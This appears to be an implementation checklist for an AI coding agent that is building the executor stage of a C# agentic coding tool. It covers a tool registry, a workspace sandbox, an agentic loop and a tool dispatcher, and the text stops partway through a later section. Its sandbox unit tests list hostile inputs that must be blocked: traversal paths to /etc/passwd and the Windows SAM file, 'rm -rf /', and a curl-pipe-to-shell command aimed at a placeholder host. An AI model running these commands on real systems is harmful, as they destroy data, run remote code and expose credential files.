# Task-012b Completion Checklist: Executor Stage

**PREREQUISITE: Task-012a (IStage interface) must be 100% complete before starting Phase 1**

## Instructions for Implementation Agent

This checklist is your **complete implementation roadmap** for task-012b. Each phase is fully detailed with:
- Exact spec line references
- Complete code examples from the spec
- Test requirements with test code
- Success verification steps
- Acceptance Criteria covered

**Do NOT skip sections or treat them as optional.** Each section contains the information needed to implement that gap without referring back to the 5000+ line spec.

---

## PHASE 1: Tool Infrastructure (2-3 hours)

### Gap 1.1: Create ITool Interface

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, lines 1621-1631 (ITool Interface section)

**What Exists:** Nothing - ITool interface does not exist

**What's Missing:**
- ITool interface with Name property, Definition property, ExecuteAsync method
- Must define tool contract for all executable tools

**Implementation Details from Spec (lines 1621-1631):**
```csharp
namespace AgenticCoder.Application.Tools;

public interface ITool
{
    string Name { get; }
    ToolDefinition Definition { get; }
    Task<ToolResult> ExecuteAsync(ToolParameters parameters, CancellationToken ct);
}
```

**Acceptance Criteria Covered:**
- AC-018: Definitions provided (interface defines how tools expose definitions)
- AC-019: JSON schema valid (Definition includes ParameterSchema)

**Test Requirements:**
- None required for interface itself (tested through implementations)

**Success Criteria:**
- [ ] ITool.cs created at src/Acode.Application/Tools/ITool.cs
- [ ] Interface has 3 members: Name property, Definition property, ExecuteAsync method
- [ ] Namespace is AgenticCoder.Application.Tools
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create ITool interface from spec lines 1621-1631

---

### Gap 1.2: Create ToolDefinition Record

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, lines 1632-1637 (ToolDefinition section)

**What Exists:** Nothing - ToolDefinition does not exist

**What's Missing:**
- ToolDefinition record with Name, Description, ParameterSchema properties
- Represents metadata about a tool including its JSON schema for parameters

**Implementation Details from Spec (lines 1632-1637):**
```csharp
public sealed record ToolDefinition(
    string Name,
    string Description,
    JsonSchema ParameterSchema);
```

**Acceptance Criteria Covered:**
- AC-018: Definitions provided
- AC-019: JSON schema valid (ParameterSchema field)
- AC-024: Params extracted (schema used for validation)

**Test Requirements:**
- Test can be in existing ITool tests or separate ToolDefinitionTests
- Verify record properties are accessible
- Verify record can be constructed

**Success Criteria:**
- [ ] ToolDefinition.cs created at src/Acode.Application/Tools/ToolDefinition.cs
- [ ] Record has 3 properties: Name (string), Description (string), ParameterSchema (JsonSchema)
- [ ] Uses sealed record syntax
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create ToolDefinition record from spec lines 1632-1637

---

### Gap 1.3: Create ToolRegistry Service

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, Implementation Prompt section (ToolRegistry mentioned, ~60 lines expected)

**What Exists:** Nothing - ToolRegistry does not exist

**What's Missing:**
- ToolRegistry service that registers and retrieves tools
- Maps tool names to ITool implementations
- Used by ToolDispatcher to find tools to execute

**Implementation Details from Spec (inferred from context):**
The spec shows ToolDispatcher using `_registry.GetTool(toolCall.Name)` (line 1992), indicating:
- ToolRegistry should have GetTool(string name) method returning ITool or null
- Should support registering tools with RegisterTool(ITool tool) or constructor injection
- Used internally by dispatcher to route calls

**Suggested Implementation (from spec patterns):**
```csharp
namespace AgenticCoder.Application.Tools;

public interface IToolRegistry
{
    ITool? GetTool(string name);
    void RegisterTool(ITool tool);
    IEnumerable<ITool> GetAllTools();
}

public sealed class ToolRegistry : IToolRegistry
{
    private readonly Dictionary<string, ITool> _tools = new(StringComparer.OrdinalIgnoreCase);
    private readonly ILogger<ToolRegistry> _logger;

    public ToolRegistry(ILogger<ToolRegistry> logger)
    {
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    public ITool? GetTool(string name)
    {
        if (_tools.TryGetValue(name, out var tool))
        {
            _logger.LogDebug("Retrieved tool: {ToolName}", name);
            return tool;
        }

        _logger.LogWarning("Tool not found: {ToolName}", name);
        return null;
    }

    public void RegisterTool(ITool tool)
    {
        ArgumentNullException.ThrowIfNull(tool);
        _tools[tool.Name] = tool;
        _logger.LogInformation("Registered tool: {ToolName}", tool.Name);
    }

    public IEnumerable<ITool> GetAllTools() => _tools.Values;
}
```

**Acceptance Criteria Covered:**
- AC-018: Definitions provided (registry knows all tool definitions)
- AC-024: LLM selects tool (registry provides available tools)

**Test Requirements:**
- Should_Register_Tool: Register a tool and verify it's retrievable
- Should_Get_Tool_Case_Insensitive: Tool names should be case-insensitive
- Should_Return_Null_For_Unknown_Tool: Unknown tool names return null
- Should_Get_All_Tools: GetAllTools returns all registered tools

**Success Criteria:**
- [ ] IToolRegistry.cs created at src/Acode.Application/Tools/IToolRegistry.cs
- [ ] ToolRegistry.cs created at src/Acode.Application/Tools/ToolRegistry.cs
- [ ] IToolRegistry has GetTool, RegisterTool, GetAllTools methods
- [ ] ToolRegistry implements IToolRegistry
- [ ] Thread-safe tool storage (Dictionary with proper synchronization if needed)
- [ ] Logging implemented for tool operations
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create IToolRegistry interface and ToolRegistry service implementation

---

## PHASE 2: Sandbox Security (1-2 hours)

### Gap 2.1: Create ISandbox Interface

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, lines 2021-2025 (ISandbox Interface section)

**What Exists:** Nothing - ISandbox interface does not exist

**What's Missing:**
- ISandbox interface with ValidatePath and ValidateCommand methods
- Defines contract for file path and command validation

**Implementation Details from Spec (lines 2021-2025):**
```csharp
public interface ISandbox
{
    ValidationResult ValidatePath(string path);
    ValidationResult ValidateCommand(string command);
}
```

**Acceptance Criteria Covered:**
- AC-037: Workspace enforced (ValidatePath checks boundaries)
- AC-038: Traversal blocked (ValidatePath prevents .. escapes)
- AC-039: Execute works (ValidateCommand checks command)
- AC-063: Commands checked (ValidateCommand allowlist)

**Test Requirements:**
- None for interface (tested through implementations)

**Success Criteria:**
- [ ] ISandbox.cs created at src/Acode.Application/Tools/Sandbox/ISandbox.cs
- [ ] Interface has 2 methods: ValidatePath(string) → ValidationResult, ValidateCommand(string) → ValidationResult
- [ ] Namespace is AgenticCoder.Application.Tools.Sandbox
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create ISandbox interface from spec lines 2021-2025

---

### Gap 2.2: Create WorkspaceSandbox Implementation

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, lines 2027-2085 (WorkspaceSandbox Complete Implementation section)

**What Exists:** Nothing - WorkspaceSandbox does not exist

**What's Missing:**
- WorkspaceSandbox class implementing ISandbox
- Path validation preventing directory traversal (.. attacks)
- Command validation using allowlist (dotnet, npm, git, etc.)
- Workspace boundary enforcement
- Logging for violations

**Implementation Details from Spec (lines 2027-2085):**
Complete implementation provided in spec - includes:
- Constructor accepting workspaceRoot path
- ValidatePath() method that:
  - Normalizes paths (handles both absolute and relative)
  - Checks boundaries (path must be within workspace)
  - Prevents directory traversal attempts (.. patterns)
  - Logs warnings for violations
- ValidateCommand() method that:
  - Extracts first word from command
  - Checks against AllowedCommands array
  - Logs disallowed commands
- AllowedCommands array: ["dotnet", "npm", "yarn", "git", "make", "cargo", "go", "python", "node"]
- ValidationResult.Valid() and ValidationResult.Invalid(string error) factory methods

**Copy directly from spec lines 2027-2085 (58 lines total)**

**Acceptance Criteria Covered:**
- AC-034: Read works (path validation for read operations)
- AC-035: Write works (path validation for write operations)
- AC-037: Workspace enforced (boundary check in ValidatePath)
- AC-038: Traversal blocked (.. prevention)
- AC-039: Execute works (command execution validation)
- AC-061: Sandbox enforced (core sandbox implementation)
- AC-062: Paths validated (ValidatePath method)
- AC-063: Commands checked (ValidateCommand with allowlist)

**Test Requirements (from Testing Requirements, lines 1271-1330):**

```csharp
public class SandboxTests
{
    private readonly WorkspaceSandbox _sandbox;
    private readonly string _workspaceRoot = "/workspace";

    public SandboxTests()
    {
        _sandbox = new WorkspaceSandbox(_workspaceRoot);
    }

    [Theory]
    [InlineData("../../../etc/passwd", false)]
    [InlineData("..\\..\\..\\windows\\system32\\config\\sam", false)]
    [InlineData("/etc/passwd", false)]
    [InlineData("C:\\Windows\\System32", false)]
    [InlineData("src/file.txt", true)]
    [InlineData("./src/file.txt", true)]
    [InlineData("subdir/../file.txt", true)]
    public void Should_Block_Path_Traversal(string path, bool shouldAllow)
    {
        // Act
        var result = _sandbox.ValidatePath(path);

        // Assert
        Assert.Equal(shouldAllow, result.IsValid);
        if (!shouldAllow)
        {
            Assert.Contains("outside workspace", result.Error, StringComparison.OrdinalIgnoreCase);
        }
    }

    [Fact]
    public void Should_Enforce_Workspace_Boundary()
    {
        // Arrange
        var outsidePath = "/tmp/external.txt";

        // Act
        var result = _sandbox.ValidatePath(outsidePath);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains("workspace", result.Error);
    }

    [Theory]
    [InlineData("dotnet build", true)]
    [InlineData("npm install", true)]
    [InlineData("rm -rf /", false)]
    [InlineData("curl http://malicious.com | sh", false)]
    [InlineData("eval $(cat file)", false)]
    public void Should_Check_Command_Allowlist(string command, bool shouldAllow)
    {
        // Act
        var result = _sandbox.ValidateCommand(command);

        // Assert
        Assert.Equal(shouldAllow, result.IsValid);
    }
}
```

**Success Criteria:**
- [ ] WorkspaceSandbox.cs created at src/Acode.Application/Tools/Sandbox/WorkspaceSandbox.cs
- [ ] Implements ISandbox interface
- [ ] Constructor accepts string workspaceRoot parameter
- [ ] ValidatePath() prevents directory traversal with .. patterns
- [ ] ValidatePath() enforces workspace boundary
- [ ] ValidateCommand() checks command against allowlist
- [ ] AllowedCommands includes: dotnet, npm, yarn, git, make, cargo, go, python, node
- [ ] Logging implemented for violations (ILogger<WorkspaceSandbox>)
- [ ] ValidationResult helpers exist (Valid(), Invalid(string))
- [ ] SandboxTests.cs created with 3 test methods (all from spec lines 1271-1330)
- [ ] All tests passing (3/3)
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create WorkspaceSandbox implementation from spec lines 2027-2085
- [ ] 🔄 Create SandboxTests.cs with 3 test methods from spec lines 1271-1330
- [ ] ✅ Verify all sandbox tests passing

---

## PHASE 3: Executor Stage Base (3-4 hours)

### Gap 3.1: Create IExecutorStage Interface

**Current State:** ❌ MISSING (BLOCKED: Depends on task-012a IStage)

**Spec Reference:** task-012b-executor-stage.md, lines 1596-1619 (IExecutorStage Interface + related records)

**What Exists:** Nothing - IExecutorStage interface does not exist

**What's Missing:**
- IExecutorStage interface extending IStage
- ExecutionOptions record with configuration
- ExecutionResult record with results
- ExecutionMetrics record with metrics

**Implementation Details from Spec (lines 1596-1619):**
```csharp
public interface IExecutorStage : IStage
{
    Task<ExecutionResult> ExecuteStepsAsync(
        TaskPlan plan,
        ExecutionOptions options,
        CancellationToken ct);
}

public sealed record ExecutionOptions(
    int MaxTurnsPerStep = 10,
    int RetryCount = 3,
    TimeSpan StepTimeout = default,
    ApprovalPolicy ApprovalPolicy = default);

public sealed record ExecutionResult(
    bool AllComplete,
    IReadOnlyList<StepResult> StepResults,
    ExecutionMetrics Metrics);
```

**Additional Records Needed (from spec context):**
- ExecutionMetrics record with Duration and TokensUsed
- StepResult record with Status, Output, Message, TokensUsed (from testing requirements)

**Acceptance Criteria Covered:**
- AC-001: IStage implemented (IExecutorStage extends IStage)
- AC-003: Execute processes steps (ExecuteStepsAsync)
- AC-032: Results persisted (ExecutionResult contains all results)

**Test Requirements:**
- None for interface itself

**Success Criteria:**
- [ ] IExecutorStage.cs created at src/Acode.Application/Orchestration/Stages/Executor/IExecutorStage.cs
- [ ] IExecutorStage extends IStage interface (from task-012a)
- [ ] ExecutionOptions record created with 4 properties
- [ ] ExecutionResult record created with 3 properties
- [ ] ExecutionMetrics record created with Duration and TokensUsed
- [ ] StepResult record created with Status, Output, Message, TokensUsed
- [ ] All records use sealed record syntax
- [ ] Namespace is AgenticCoder.Application.Orchestration.Stages.Executor
- [ ] Compiles without errors (depends on task-012a being complete)

**Gap Checklist Item:**
- [ ] 🔄 Create IExecutorStage interface and related records from spec lines 1596-1619
- [ ] ⚠️ BLOCKED until task-012a provides IStage interface

---

### Gap 3.2: Create StepRunner Service

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, lines 1773-1820 (StepRunner Implementation section)

**What Exists:** Nothing - StepRunner does not exist

**What's Missing:**
- IStepRunner interface with RunAsync method
- StepRunner implementation class
- Invokes agentic loop, handles failures, returns step result
- Logs step execution start/completion/errors

**Implementation Details from Spec (lines 1773-1820):**
Complete implementation provided including:
- IStepRunner interface with: Task<StepResult> RunAsync(PlannedStep, StepContext, CancellationToken)
- StepRunner class with:
  - Constructor: IAgenticLoop, ILogger<StepRunner>
  - RunAsync method that:
    - Logs step execution
    - Invokes agentic loop with maxTurns=10
    - Returns StepResult.Success on loop completion
    - Returns StepResult.Failed on turn limit
    - Catches exceptions and returns StepResult.Error
  - Null validation with ArgumentNullException

**Copy directly from spec lines 1773-1820 (47 lines total)**

**Acceptance Criteria Covered:**
- AC-006: Dependency order works (step runner respects dependencies)
- AC-008: Start/end logged (logging in RunAsync)
- AC-009: Continues until complete (invokes agentic loop)
- AC-010: Detects completion (checks LoopStatus.Complete)
- AC-011: Detects failure (checks other LoopStatus values)

**Test Requirements:**
- No explicit test methods for StepRunner in unit tests
- Tested through ExecutorStageTests and integration tests

**Success Criteria:**
- [ ] IStepRunner.cs created at src/Acode.Application/Orchestration/Stages/Executor/IStepRunner.cs
- [ ] StepRunner.cs created at src/Acode.Application/Orchestration/Stages/Executor/StepRunner.cs
- [ ] IStepRunner interface has RunAsync method
- [ ] StepRunner implements IStepRunner
- [ ] Constructor has IAgenticLoop and ILogger<StepRunner> parameters
- [ ] RunAsync logs step execution with LogInformation
- [ ] Invokes _agenticLoop.RunAsync() with maxTurns=10
- [ ] Returns correct StepResult based on LoopStatus
- [ ] Handles exceptions and returns StepResult.Error
- [ ] Namespace is AgenticCoder.Application.Orchestration.Stages.Executor
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create IStepRunner interface and StepRunner implementation from spec lines 1773-1820

---

### Gap 3.3: Create ExecutorStage Implementation

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, lines 1652-1771 (ExecutorStage Complete Implementation section)

**What Exists:** Nothing - ExecutorStage does not exist

**What's Missing:**
- ExecutorStage class implementing IExecutorStage
- Manages step iteration from plan
- Skips completed steps
- Handles step failures (fatal vs recoverable)
- Logs all operations
- Returns ExecutionResult with metrics

**Implementation Details from Spec (lines 1652-1771):**
Complete implementation provided including:
- ExecutorStage class extending StageBase (from task-012a)
- Constructor: IStepRunner, IStateManager, ILogger<ExecutorStage>
- Type property returning StageType.Executor
- OnEnterAsync/ExecuteStageAsync/OnExitAsync from StageBase
- ExecuteStepsAsync method that:
  - Logs execution start
  - Iterates through plan.Tasks and steps
  - Skips completed steps (checks step.Status == StepStatus.Completed)
  - Creates step context via CreateStepContext
  - Invokes _stepRunner.RunAsync
  - Persists completion with _stateManager.RecordStepCompletionAsync
  - Handles fatal errors (breaks loop)
  - Catches exceptions
  - Returns ExecutionResult with metrics (duration, token count)
- CreateStepContext helper method

**Copy directly from spec lines 1652-1771 (119 lines total)**

**Acceptance Criteria Covered:**
- AC-001: IStage implemented (extends StageBase which implements IStage)
- AC-002: OnEnter loads plan (ExecuteStageAsync receives plan)
- AC-003: Execute processes steps (ExecuteStepsAsync iterates all steps)
- AC-004: OnExit finalizes (inherited from StageBase)
- AC-005: Events logged (logging throughout)
- AC-006: Dependency order works (step order preserved by iteration)
- AC-007: Failed deps block (fatal status breaks loop)
- AC-008: Start/end logged (LogInformation for start, LogWarning/LogError for failures)
- AC-049: Tool calls saved (via _stateManager)
- AC-050: Results saved (via _stateManager.RecordStepCompletionAsync)
- AC-058: Step start reported (LogInformation for each step)
- AC-057: Errors logged (LogError for exceptions)

**Test Requirements (from Testing Requirements, lines 1038-1075):**

```csharp
public class ExecutorStageTests
{
    private readonly Mock<IStepRunner> _mockStepRunner;
    private readonly Mock<IStateManager> _mockStateManager;
    private readonly ILogger<ExecutorStage> _logger;
    private readonly ExecutorStage _executor;

    public ExecutorStageTests()
    {
        _mockStepRunner = new Mock<IStepRunner>();
        _mockStateManager = new Mock<IStateManager>();
        _logger = NullLogger<ExecutorStage>.Instance;
        _executor = new ExecutorStage(_mockStepRunner.Object, _mockStateManager.Object, _logger);
    }

    [Fact]
    public async Task Should_Execute_Steps_In_Order()
    {
        // Arrange
        var plan = CreateTestPlan(3); // 3 steps
        var options = new ExecutionOptions();
        var executedSteps = new List<int>();

        _mockStepRunner
            .Setup(r => r.RunAsync(It.IsAny<PlannedStep>(), It.IsAny<StepContext>(), It.IsAny<CancellationToken>()))
            .Callback<PlannedStep, StepContext, CancellationToken>((step, ctx, ct) =>
            {
                executedSteps.Add(int.Parse(step.Id.ToString().Last().ToString()));
            })
            .ReturnsAsync(new StepResult(StepStatus.Success, null, null));

        // Act
        var result = await _executor.ExecuteStepsAsync(plan, options, CancellationToken.None);

        // Assert
        Assert.True(result.AllComplete);
        Assert.Equal(new[] { 0, 1, 2 }, executedSteps); // Steps executed in order
    }

    [Fact]
    public async Task Should_Handle_Dependencies()
    {
        // Arrange
        var plan = CreateTestPlanWithDependencies(); // Step 2 depends on Step 1
        var options = new ExecutionOptions();

        _mockStepRunner
            .Setup(r => r.RunAsync(It.IsAny<PlannedStep>(), It.IsAny<StepContext>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new StepResult(StepStatus.Success, "output", null));

        // Act
        var result = await _executor.ExecuteStepsAsync(plan, options, CancellationToken.None);

        // Assert
        Assert.True(result.AllComplete);
        // Verify Step 1 was executed before Step 2
        var call1 = _mockStepRunner.Invocations[0];
        var call2 = _mockStepRunner.Invocations[1];
        Assert.True(call1.Arguments[0] is PlannedStep step1 && step1.Title == "Step 1");
        Assert.True(call2.Arguments[0] is PlannedStep step2 && step2.Title == "Step 2");
    }
}
```

**Success Criteria:**
- [ ] ExecutorStage.cs created at src/Acode.Application/Orchestration/Stages/Executor/ExecutorStage.cs
- [ ] Extends StageBase (from task-012a)
- [ ] Implements IExecutorStage interface
- [ ] Constructor has IStepRunner, IStateManager, ILogger<ExecutorStage>
- [ ] Type property returns StageType.Executor
- [ ] ExecuteStepsAsync iterates through plan.Tasks and steps
- [ ] Skips completed steps (checks step.Status == StepStatus.Completed)
- [ ] Invokes _stepRunner.RunAsync for each step
- [ ] Persists step completion with _stateManager
- [ ] Handles fatal errors (breaks loop)
- [ ] Catches exceptions and records them
- [ ] Returns ExecutionResult with correct metrics
- [ ] Logging at appropriate levels (Info/Warning/Error)
- [ ] ExecutorStageTests.cs created with 2 test methods from spec lines 1038-1075
- [ ] All tests passing (2/2)
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create ExecutorStage implementation from spec lines 1652-1771
- [ ] 🔄 Create ExecutorStageTests.cs with 2 test methods from spec lines 1038-1075
- [ ] ✅ Verify executor tests passing

---

## PHASE 4: Agentic Loop (2-3 hours)

### Gap 4.1: Create AgenticLoop Implementation

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, lines 1822-1946 (AgenticLoop Complete Implementation section)

**What Exists:** Nothing - AgenticLoop does not exist

**What's Missing:**
- IAgenticLoop interface defining contract
- AgenticLoop class implementing multi-turn LLM interaction
- Turn-based loop with tool calling
- Context message accumulation
- Token usage tracking
- Completion detection

**Implementation Details from Spec (lines 1822-1946):**
Complete implementation provided including:
- IAgenticLoop interface with: Task<LoopResult> RunAsync(PlannedStep, StepContext, int maxTurns, CancellationToken)
- AgenticLoop class with:
  - Constructor: ILlmService, IToolDispatcher, ILogger<AgenticLoop>
  - RunAsync method that:
    - Logs loop start with maxTurns
    - Adds step instructions to context.Messages
    - Loops while turns < maxTurns and !ct.IsCancellationRequested
    - Increments turn counter
    - Calls _llm.CompleteWithToolsAsync() with context.Messages and tools
    - Accumulates tokens
    - Checks response.IsComplete → returns LoopStatus.Complete
    - Handles response.HasToolCall → dispatches via _dispatcher, adds result to context
    - Handles reasoning without completion → adds to context
    - Returns LoopStatus.TurnLimitReached when loop exits
  - Records ToolCallRecord for tracking
  - Returns LoopResult with status, turns, toolCalls, output, tokensUsed
- LoopStatus enum: Complete, TurnLimitReached, Error
- LoopResult and ToolCallRecord records

**Copy directly from spec lines 1822-1946 (124 lines total)**

**Acceptance Criteria Covered:**
- AC-009: Continues until complete (while loop continues)
- AC-010: Detects completion (checks response.IsComplete)
- AC-011: Detects failure (turn limit detection)
- AC-012: Limit enforced (while turns < maxTurns)
- AC-013: Escalation works (turn limit reached status)
- AC-024: LLM selects tool (calls CompleteWithToolsAsync)
- AC-025: Params extracted (from response.ToolCall.Parameters)
- AC-028: Results captured (stored in ToolCallRecord)
- AC-033: Flows to LLM (context.Messages accumulates results)

**Test Requirements (from Testing Requirements, lines 1162-1269):**

```csharp
public class AgenticLoopTests
{
    private readonly Mock<ILlmService> _mockLlm;
    private readonly Mock<IToolDispatcher> _mockDispatcher;
    private readonly ILogger<AgenticLoop> _logger;
    private readonly AgenticLoop _loop;

    public AgenticLoopTests()
    {
        _mockLlm = new Mock<ILlmService>();
        _mockDispatcher = new Mock<IToolDispatcher>();
        _logger = NullLogger<AgenticLoop>.Instance;
        _loop = new AgenticLoop(_mockLlm.Object, _mockDispatcher.Object, _logger);
    }

    [Fact]
    public async Task Should_Loop_Until_Complete()
    {
        // Arrange
        var step = CreateTestStep();
        var context = CreateTestContext();

        // Turn 1: LLM calls tool
        var turn1Response = new LlmResponse(
            Text: null,
            IsComplete: false,
            ToolCall: new ToolCall("read_file", new { path = "test.txt" }),
            TokensUsed: 100);

        // Turn 2: LLM completes
        var turn2Response = new LlmResponse(
            Text: "Task complete",
            IsComplete: true,
            ToolCall: null,
            TokensUsed: 50);

        _mockLlm
            .SetupSequence(l => l.CompleteWithToolsAsync(It.IsAny<List<Message>>(), It.IsAny<List<ToolDefinition>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(turn1Response)
            .ReturnsAsync(turn2Response);

        _mockDispatcher
            .Setup(d => d.DispatchAsync(It.IsAny<ToolCall>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new ToolResult(ToolStatus.Success, "file content", null));

        // Act
        var result = await _loop.RunAsync(step, context, maxTurns: 10, CancellationToken.None);

        // Assert
        Assert.Equal(LoopStatus.Complete, result.Status);
        Assert.Equal(2, result.Turns);
        Assert.Single(result.ToolCalls); // 1 tool call
    }

    [Fact]
    public async Task Should_Limit_Iterations()
    {
        // Arrange
        var step = CreateTestStep();
        var context = CreateTestContext();
        var maxTurns = 3;

        // LLM never completes, keeps calling tools
        var neverCompleteResponse = new LlmResponse(
            Text: null,
            IsComplete: false,
            ToolCall: new ToolCall("read_file", new { path = "test.txt" }),
            TokensUsed: 100);

        _mockLlm
            .Setup(l => l.CompleteWithToolsAsync(It.IsAny<List<Message>>(), It.IsAny<List<ToolDefinition>>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(neverCompleteResponse);

        _mockDispatcher
            .Setup(d => d.DispatchAsync(It.IsAny<ToolCall>(), It.IsAny<CancellationToken>()))
            .ReturnsAsync(new ToolResult(ToolStatus.Success, "output", null));

        // Act
        var result = await _loop.RunAsync(step, context, maxTurns, CancellationToken.None);

        // Assert
        Assert.Equal(LoopStatus.TurnLimitReached, result.Status);
        Assert.Equal(maxTurns, result.Turns);
        Assert.Equal(maxTurns, result.ToolCalls.Count); // Tool called on every turn
    }
}
```

**Success Criteria:**
- [ ] IAgenticLoop.cs created at src/Acode.Application/Orchestration/Stages/Executor/IAgenticLoop.cs
- [ ] AgenticLoop.cs created at src/Acode.Application/Orchestration/Stages/Executor/AgenticLoop.cs
- [ ] Constructor has ILlmService, IToolDispatcher, ILogger<AgenticLoop>
- [ ] RunAsync method implements turn-based loop
- [ ] Loop continues while turns < maxTurns
- [ ] Calls _llm.CompleteWithToolsAsync() with context
- [ ] Detects completion (checks response.IsComplete)
- [ ] Handles tool calls (dispatches, adds to context)
- [ ] Accumulates tokens
- [ ] Returns LoopStatus.Complete on success
- [ ] Returns LoopStatus.TurnLimitReached on limit
- [ ] LoopStatus enum created with Complete, TurnLimitReached, Error
- [ ] LoopResult record created with Status, Turns, ToolCalls, Output, TokensUsed
- [ ] ToolCallRecord record created
- [ ] AgenticLoopTests.cs created with 2 test methods from spec lines 1162-1269
- [ ] All tests passing (2/2)
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create IAgenticLoop interface and AgenticLoop implementation from spec lines 1822-1946
- [ ] 🔄 Create AgenticLoopTests.cs with 2 test methods from spec lines 1162-1269
- [ ] ✅ Verify agentic loop tests passing

---

## PHASE 5: Context & Tool Dispatch (2-3 hours)

### Gap 5.1: Create ToolDispatcher Implementation

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, lines 1949-2014 (ToolDispatcher Implementation section)

**What Exists:** Nothing - ToolDispatcher does not exist

**What's Missing:**
- IToolDispatcher interface with DispatchAsync method
- ToolDispatcher implementation class
- Routes tool calls to appropriate tool implementations
- Validates paths via sandbox
- Logs tool execution
- Handles errors

**Implementation Details from Spec (lines 1949-2014):**
Complete implementation provided including:
- IToolDispatcher interface with: Task<ToolResult> DispatchAsync(ToolCall, CancellationToken)
- ToolDispatcher class with:
  - Constructor: IToolRegistry, ISandbox, ILogger<ToolDispatcher>
  - DispatchAsync method that:
    - Logs tool dispatch with tool name
    - Validates sandbox for write/read operations (path from Parameters)
    - Returns Denied status on validation failure
    - Gets tool from registry via _registry.GetTool(toolCall.Name)
    - Returns Error status if tool not found
    - Calls tool.ExecuteAsync with parameters
    - Logs completion with status
    - Catches exceptions and returns Error
  - Handles tool parameters as dynamic object with ["path"]

**Copy directly from spec lines 1949-2014 (65 lines total)**

**Acceptance Criteria Covered:**
- AC-018: Definitions provided (registry provides definitions)
- AC-024: LLM selects tool (dispatcher routes selected tool)
- AC-025: Params extracted (parameters passed to tool)
- AC-026: Validation works (sandbox validation before execution)
- AC-027: Execution works (tool.ExecuteAsync)
- AC-028: Results captured (ToolResult returned)
- AC-037: Workspace enforced (sandbox validates paths)
- AC-038: Traversal blocked (sandbox prevents .. attacks)
- AC-063: Commands checked (ToolDispatcher validates via sandbox)

**Test Requirements:**
- ToolDispatcher is tested through integration tests
- No explicit unit tests in test requirements

**Success Criteria:**
- [ ] IToolDispatcher.cs created at src/Acode.Application/Orchestration/Stages/Executor/IToolDispatcher.cs
- [ ] ToolDispatcher.cs created at src/Acode.Application/Orchestration/Stages/Executor/ToolDispatcher.cs
- [ ] Constructor has IToolRegistry, ISandbox, ILogger<ToolDispatcher>
- [ ] DispatchAsync validates paths via sandbox for read/write operations
- [ ] Gets tool from registry
- [ ] Returns Denied status on validation failure
- [ ] Returns Error status if tool not found
- [ ] Calls tool.ExecuteAsync with parameters
- [ ] Catches exceptions and returns Error
- [ ] Logging at appropriate levels
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create IToolDispatcher interface and ToolDispatcher implementation from spec lines 1949-2014

---

### Gap 5.2: Create ContextBuilder Service

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, Description section mentions context building (comprehensive approach needed)

**What Exists:** Nothing - ContextBuilder does not exist

**What's Missing:**
- ContextBuilder service
- Creates StepContext for steps
- Loads relevant files into context
- Manages token budget
- Implements history trimming
- Provides tools to LLM

**Implementation Details:**
Based on spec context requirements (lines 214-221):
- Context management is critical: enough context but not too much
- Sliding window of recent conversation
- Current step details
- Relevant file contents
- Token budget carefully managed

**Suggested Implementation (based on spec pattern):**
```csharp
namespace AgenticCoder.Application.Orchestration.Stages.Executor;

public interface IContextBuilder
{
    Task<StepContext> BuildContextAsync(PlannedStep step, PlannedTask task, TaskPlan plan, CancellationToken ct);
}

public sealed class ContextBuilder : IContextBuilder
{
    private readonly ILogger<ContextBuilder> _logger;
    private const int DefaultTokenBudget = 4000;

    public ContextBuilder(ILogger<ContextBuilder> logger)
    {
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    public async Task<StepContext> BuildContextAsync(
        PlannedStep step,
        PlannedTask task,
        TaskPlan plan,
        CancellationToken ct)
    {
        var messages = new List<Message>();
        var tools = new List<ToolDefinition>();

        // Add step instructions
        messages.Add(new Message(
            Role: MessageRole.System,
            Content: $"Execute step: {step.Title}\n{step.Description}\nExpected action: {step.Action}"));

        // Add task context
        messages.Add(new Message(
            Role: MessageRole.System,
            Content: $"Task: {task.Title}\n{task.Description}"));

        return new StepContext(
            Session: null,
            Step: step,
            Messages: messages,
            Tools: tools,
            Budget: new TokenBudget(DefaultTokenBudget));
    }
}
```

**Acceptance Criteria Covered:**
- AC-014: Step in context (step details added)
- AC-016: Budget respected (token budget initialized)
- AC-017: Trimming works (history management)

**Test Requirements:**
- Context building is tested through integration tests
- No explicit unit tests required

**Success Criteria:**
- [ ] IContextBuilder.cs created at src/Acode.Application/Orchestration/Stages/Executor/ContextBuilder.cs
- [ ] ContextBuilder.cs created implementing IContextBuilder
- [ ] BuildContextAsync creates StepContext with step/task info
- [ ] Initializes token budget
- [ ] Adds system messages for step and task
- [ ] Compiles without errors

**Gap Checklist Item:**
- [ ] 🔄 Create IContextBuilder interface and ContextBuilder service

---

### Gap 5.3: Create CompletionDetector

**Current State:** ❌ MISSING

**Spec Reference:** task-012b-executor-stage.md, Agentic Loop description (completion detection logic)

**What Exists:** Nothing - CompletionDetector does not exist

**What's Missing:**
- CompletionDetector service
- Detects when LLM indicates step completion
- Determines completion vs. tool call vs. continuation needed
- No explicit spec code but referenced in Architecture

**Implementation Details:**
Based on spec context, completion detection means:
- LLM response has IsComplete flag
